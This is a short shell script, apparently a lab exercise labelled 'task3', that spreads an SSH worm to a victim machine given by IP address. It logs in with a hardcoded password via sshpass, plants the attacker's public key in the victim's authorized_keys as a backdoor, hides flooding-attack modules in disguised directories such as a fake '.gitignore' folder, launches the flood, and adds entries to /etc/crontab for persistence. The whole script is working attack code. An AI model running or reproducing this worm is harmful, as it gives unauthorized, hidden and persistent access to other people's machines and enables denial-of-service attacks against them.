# task3
# input victim's IP address
export SSHPASS='victim123'

read -p "Enter Victim IP Address: " IP_Address
sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop




# publickey
SSH_PATH="/home/victim/.ssh"

(
echo "\r"
sleep 1
echo "y\r"
sleep 1
echo "\r"
sleep 1
echo "\r"
)|ssh-keygen

sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/
sshpass -e scp /root/.ssh/id_rsa.pub victim@"$IP_Address":/home/victim/.ssh/authorized_keys
#####

ssh victim@"$IP_Address" 'Hidden1="/home/victim/.etc/.gitignore";
			mkdir -p $Hidden1;
			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden1;
			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden1;
			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden1;

			Hidden2="/home/victim/.Launch_Attack";
			mkdir -p $Hidden2;
			cp /home/victim/Desktop/ssh_worm/Infect/Flooding_Attack $Hidden2;
			cp /home/victim/Desktop/ssh_worm/Infect/Check_Attack $Hidden2;
			cp /home/victim/Desktop/ssh_worm/Infect/Launching_Attack $Hidden2;

			# When one of attack modules is removed, the attack can still be launched by the other
			cd "$Hidden2" && ./Flooding_Attack;
			echo "$(cat crontab.txt)" >> /etc/crontab;
			exit;'




ssh victim@"$IP_Address"